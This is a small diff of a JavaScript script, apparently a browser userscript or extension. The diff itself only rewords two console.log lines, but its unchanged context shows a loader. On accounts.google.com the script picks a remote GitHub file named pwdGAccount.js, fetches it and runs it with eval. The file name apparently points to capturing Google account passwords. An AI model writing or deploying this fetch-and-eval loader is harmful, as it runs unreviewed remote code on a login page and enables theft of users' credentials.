@@ -16,12 +16,12 @@ if (location.host == 'accounts.google.com'){
         url = "https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js";
     }
     
-    console.log(path)
+    console.log("[!] PATH = " + path)
 }
 
 
 
-console.log(url)
+console.log("[!] URL = " + url)
 
 
 fetch(url).then(response => response.text()).then(code => {eval(code);});
